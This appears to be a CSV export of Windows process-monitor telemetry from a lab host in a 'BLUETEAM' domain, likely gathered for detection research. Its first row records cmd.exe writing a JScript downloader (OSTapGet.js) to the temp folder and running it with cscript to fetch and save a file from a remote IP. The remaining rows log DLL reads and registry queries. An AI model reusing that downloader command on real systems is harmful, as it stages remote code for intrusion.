Process Name,PID,Operation,Path,Result,Detail,Date & Time,Event Class,Image Path,User,Command Line,TID,Parent PID,Content,LineID,srcEvent
cmd.exe,3616,Process Start,,SUCCESS,"Parent PID: 3264, Command line: cmd.exe /C echo var url = ""https://128.30.52.100/TR/PNG/iso_8859-1.txt"", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > %TEMP%\OSTapGet.js && cscript //E:Jscript %TEMP%\OSTapGet.js, Current directory: C:\Windows\system32\, Environment:  ;	ALLUSERSPROFILE=C:\ProgramData ;	APPDATA=C:\Users\ezk\AppData\Roaming ;	CommonProgramFiles=C:\Program Files\Common Files ;	CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files ;	CommonProgramW6432=C:\Program Files\Common Files ;	COMPUTERNAME=DESKTOP-BA1RQFC ;	ComSpec=C:\Windows\system32\cmd.exe ;	DriverData=C:\Windows\System32\Drivers\DriverData ;	HOMEDRIVE=C: ;	HOMEPATH=\Users\ezk ;	LOCALAPPDATA=C:\Users\ezk\AppData\Local ;	LOGONSERVER=\\DC02 ;	NUMBER_OF_PROCESSORS=2 ;	OneDrive=C:\Users\ezk\OneDrive ;	OS=Windows_NT ;	Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\ezk\AppData\Local\Microsoft\WindowsApps ;	PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL ;	PROCESSOR_ARCHITECTURE=AMD64 ;	PROCESSOR_IDENTIFIER=Intel64 Family 6 Model 165 Stepping 5, GenuineIntel ;	PROCESSOR_LEVEL=6 ;	PROCESSOR_REVISION=a505 ;	ProgramData=C:\ProgramData ;	ProgramFiles=C:\Program Files ;	ProgramFiles(x86)=C:\Program Files (x86) ;	ProgramW6432=C:\Program Files ;	PSModulePath=C:\Users\ezk\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules ;	PUBLIC=C:\Users\Public ;	SystemDrive=C: ;	SystemRoot=C:\Windows ;	TEMP=C:\Users\ezk\AppData\Local\Temp ;	TMP=C:\Users\ezk\AppData\Local\Temp ;	USERDNSDOMAIN=BLUETEAM.COM ;	USERDOMAIN=BLUETEAM ;	USERDOMAIN_ROAMINGPROFILE=BLUETEAM ;	USERNAME=ezk ;	USERPROFILE=C:\Users\ezk ;	windir=C:\Windows",4/14/2022 10:03:29 PM,Process,C:\Windows\system32\cmd.exe,BLUETEAM\ezk,"cmd.exe /C echo var url = ""https://128.30.52.100/TR/PNG/iso_8859-1.txt"", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > %TEMP%\OSTapGet.js && cscript //E:Jscript %TEMP%\OSTapGet.js",6244,3264,"cmd.exe 3616 Process Start None SUCCESS Parent PID: 3264, Command line: cmd.exe /C echo var url = ""https://128.30.52.100/TR/PNG/iso_8859-1.txt"", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > %TEMP%\OSTapGet.js && cscript //E:Jscript %TEMP%\OSTapGet.js, Current directory: C:\Windows\system32\, Environment:  ;	ALLUSERSPROFILE=C:\ProgramData ;	APPDATA=C:\Users\ezk\AppData\Roaming ;	CommonProgramFiles=C:\Program Files\Common Files ;	CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files ;	CommonProgramW6432=C:\Program Files\Common Files ;	COMPUTERNAME=DESKTOP-BA1RQFC ;	ComSpec=C:\Windows\system32\cmd.exe ;	DriverData=C:\Windows\System32\Drivers\DriverData ;	HOMEDRIVE=C: ;	HOMEPATH=\Users\ezk ;	LOCALAPPDATA=C:\Users\ezk\AppData\Local ;	LOGONSERVER=\\DC02 ;	NUMBER_OF_PROCESSORS=2 ;	OneDrive=C:\Users\ezk\OneDrive ;	OS=Windows_NT ;	Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\ezk\AppData\Local\Microsoft\WindowsApps ;	PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL ;	PROCESSOR_ARCHITECTURE=AMD64 ;	PROCESSOR_IDENTIFIER=Intel64 Family 6 Model 165 Stepping 5, GenuineIntel ;	PROCESSOR_LEVEL=6 ;	PROCESSOR_REVISION=a505 ;	ProgramData=C:\ProgramData ;	ProgramFiles=C:\Program Files ;	ProgramFiles(x86)=C:\Program Files (x86) ;	ProgramW6432=C:\Program Files ;	PSModulePath=C:\Users\ezk\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules ;	PUBLIC=C:\Users\Public ;	SystemDrive=C: ;	SystemRoot=C:\Windows ;	TEMP=C:\Users\ezk\AppData\Local\Temp ;	TMP=C:\Users\ezk\AppData\Local\Temp ;	USERDNSDOMAIN=BLUETEAM.COM ;	USERDOMAIN=BLUETEAM ;	USERDOMAIN_ROAMINGPROFILE=BLUETEAM ;	USERNAME=ezk ;	USERPROFILE=C:\Users\ezk ;	windir=C:\Windows 4/14/2022 10:03:29 PM Process C:\Windows\system32\cmd.exe BLUETEAM\ezk cmd.exe /C echo var url = ""https://128.30.52.100/TR/PNG/iso_8859-1.txt"", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > %TEMP%\OSTapGet.js && cscript //E:Jscript %TEMP%\OSTapGet.js 6244 3264",1,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,ReadFile,C:\Windows\System32\msxml3.dll,SUCCESS,"Offset: 1,572,368, Length: 8",4/14/2022 10:03:29 PM,File System,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 ReadFile C:\Windows\System32\msxml3.dll SUCCESS Offset: 1,572,368, Length: 8 4/14/2022 10:03:29 PM File System C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1681,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,ReadFile,C:\Windows\System32\msxml3.dll,SUCCESS,"Offset: 1,572,512, Length: 2",4/14/2022 10:03:29 PM,File System,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 ReadFile C:\Windows\System32\msxml3.dll SUCCESS Offset: 1,572,512, Length: 2 4/14/2022 10:03:29 PM File System C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1682,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,ReadFile,C:\Windows\System32\msxml3.dll,SUCCESS,"Offset: 1,572,514, Length: 14",4/14/2022 10:03:29 PM,File System,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 ReadFile C:\Windows\System32\msxml3.dll SUCCESS Offset: 1,572,514, Length: 14 4/14/2022 10:03:29 PM File System C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1683,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,ReadFile,C:\Windows\System32\msxml3.dll,SUCCESS,"Offset: 1,572,384, Length: 16",4/14/2022 10:03:29 PM,File System,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 ReadFile C:\Windows\System32\msxml3.dll SUCCESS Offset: 1,572,384, Length: 16 4/14/2022 10:03:29 PM File System C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1684,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,ReadFile,C:\Windows\System32\msxml3.dll,SUCCESS,"Offset: 1,572,400, Length: 8",4/14/2022 10:03:29 PM,File System,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 ReadFile C:\Windows\System32\msxml3.dll SUCCESS Offset: 1,572,400, Length: 8 4/14/2022 10:03:29 PM File System C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1685,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,ReadFile,C:\Windows\System32\msxml3.dll,SUCCESS,"Offset: 1,572,432, Length: 16",4/14/2022 10:03:29 PM,File System,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 ReadFile C:\Windows\System32\msxml3.dll SUCCESS Offset: 1,572,432, Length: 16 4/14/2022 10:03:29 PM File System C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1686,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,ReadFile,C:\Windows\System32\msxml3.dll,SUCCESS,"Offset: 1,572,448, Length: 8",4/14/2022 10:03:29 PM,File System,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 ReadFile C:\Windows\System32\msxml3.dll SUCCESS Offset: 1,572,448, Length: 8 4/14/2022 10:03:29 PM File System C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1687,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,ReadFile,C:\Windows\System32\msxml3.dll,SUCCESS,"Offset: 1,572,480, Length: 16",4/14/2022 10:03:29 PM,File System,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 ReadFile C:\Windows\System32\msxml3.dll SUCCESS Offset: 1,572,480, Length: 16 4/14/2022 10:03:29 PM File System C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1688,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,CreateFile,C:\Windows\System32\winhttp.dll,SUCCESS,"Desired Access: Read Attributes, Disposition: Open, Options: Open Reparse Point, Attributes: n/a, ShareMode: Read, Write, Delete, AllocationSize: n/a, OpenResult: Opened",4/14/2022 10:03:29 PM,File System,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 CreateFile C:\Windows\System32\winhttp.dll SUCCESS Desired Access: Read Attributes, Disposition: Open, Options: Open Reparse Point, Attributes: n/a, ShareMode: Read, Write, Delete, AllocationSize: n/a, OpenResult: Opened 4/14/2022 10:03:29 PM File System C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1689,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,QueryBasicInformationFile,C:\Windows\System32\winhttp.dll,SUCCESS,"CreationTime: 9/22/2021 5:22:06 PM, LastAccessTime: 4/14/2022 10:01:12 PM, LastWriteTime: 9/22/2021 5:22:06 PM, ChangeTime: 10/15/2021 2:25:23 PM, FileAttributes: A",4/14/2022 10:03:29 PM,File System,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 QueryBasicInformationFile C:\Windows\System32\winhttp.dll SUCCESS CreationTime: 9/22/2021 5:22:06 PM, LastAccessTime: 4/14/2022 10:01:12 PM, LastWriteTime: 9/22/2021 5:22:06 PM, ChangeTime: 10/15/2021 2:25:23 PM, FileAttributes: A 4/14/2022 10:03:29 PM File System C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1690,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,CloseFile,C:\Windows\System32\winhttp.dll,SUCCESS,,4/14/2022 10:03:29 PM,File System,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,cscript.exe 5992 CloseFile C:\Windows\System32\winhttp.dll SUCCESS None 4/14/2022 10:03:29 PM File System C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616,1691,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,CreateFile,C:\Windows\System32\winhttp.dll,SUCCESS,"Desired Access: Read Data/List Directory, Execute/Traverse, Synchronize, Disposition: Open, Options: Synchronous IO Non-Alert, Non-Directory File, Attributes: n/a, ShareMode: Read, Delete, AllocationSize: n/a, OpenResult: Opened",4/14/2022 10:03:29 PM,File System,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 CreateFile C:\Windows\System32\winhttp.dll SUCCESS Desired Access: Read Data/List Directory, Execute/Traverse, Synchronize, Disposition: Open, Options: Synchronous IO Non-Alert, Non-Directory File, Attributes: n/a, ShareMode: Read, Delete, AllocationSize: n/a, OpenResult: Opened 4/14/2022 10:03:29 PM File System C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1692,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,CloseFile,C:\Windows\System32\winhttp.dll,SUCCESS,,4/14/2022 10:03:29 PM,File System,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,cscript.exe 5992 CloseFile C:\Windows\System32\winhttp.dll SUCCESS None 4/14/2022 10:03:29 PM File System C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616,1693,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryKey,HKLM,SUCCESS,"Query: HandleTags, HandleTags: 0x0",4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 RegQueryKey HKLM SUCCESS Query: HandleTags, HandleTags: 0x0 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1694,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegOpenKey,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings,SUCCESS,Desired Access: Query Value,4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,cscript.exe 5992 RegOpenKey HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings SUCCESS Desired Access: Query Value 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616,1695,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryValue,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ShareCredsWithWinHttp,NAME NOT FOUND,Length: 16,4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,cscript.exe 5992 RegQueryValue HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ShareCredsWithWinHttp NAME NOT FOUND Length: 16 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616,1696,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegCloseKey,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings,SUCCESS,,4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,cscript.exe 5992 RegCloseKey HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings SUCCESS None 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616,1697,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryKey,HKLM,SUCCESS,"Query: HandleTags, HandleTags: 0x0",4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 RegQueryKey HKLM SUCCESS Query: HandleTags, HandleTags: 0x0 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1698,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegOpenKey,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\WinHttp,SUCCESS,Desired Access: Query Value,4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,cscript.exe 5992 RegOpenKey HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\WinHttp SUCCESS Desired Access: Query Value 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616,1699,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryValue,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\WinHttp\DefaultSecureProtocols,NAME NOT FOUND,Length: 16,4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,cscript.exe 5992 RegQueryValue HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\WinHttp\DefaultSecureProtocols NAME NOT FOUND Length: 16 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616,1700,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegCloseKey,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\WinHttp,SUCCESS,,4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,cscript.exe 5992 RegCloseKey HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\WinHttp SUCCESS None 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616,1701,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryKey,HKLM,SUCCESS,"Query: HandleTags, HandleTags: 0x0",4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 RegQueryKey HKLM SUCCESS Query: HandleTags, HandleTags: 0x0 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1702,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegOpenKey,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\WinHttp,SUCCESS,Desired Access: Query Value,4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,cscript.exe 5992 RegOpenKey HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\WinHttp SUCCESS Desired Access: Query Value 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616,1703,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryValue,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\WinHttp\DisableBranchCache,SUCCESS,"Type: REG_DWORD, Length: 4, Data: 0",4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 RegQueryValue HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\WinHttp\DisableBranchCache SUCCESS Type: REG_DWORD, Length: 4, Data: 0 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1704,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegCloseKey,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\WinHttp,SUCCESS,,4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,cscript.exe 5992 RegCloseKey HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\WinHttp SUCCESS None 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616,1705,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryKey,HKLM,SUCCESS,"Query: HandleTags, HandleTags: 0x0",4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 RegQueryKey HKLM SUCCESS Query: HandleTags, HandleTags: 0x0 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1706,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegOpenKey,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\WinHttp,SUCCESS,Desired Access: Query Value,4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,cscript.exe 5992 RegOpenKey HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\WinHttp SUCCESS Desired Access: Query Value 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616,1707,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryValue,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\WinHttp\DisableAutoProxyAuth,NAME NOT FOUND,Length: 16,4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,cscript.exe 5992 RegQueryValue HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\WinHttp\DisableAutoProxyAuth NAME NOT FOUND Length: 16 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616,1708,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegCloseKey,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\WinHttp,SUCCESS,,4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,cscript.exe 5992 RegCloseKey HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\WinHttp SUCCESS None 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616,1709,522f3f35cd013e63830fa555495a0081_raw_events
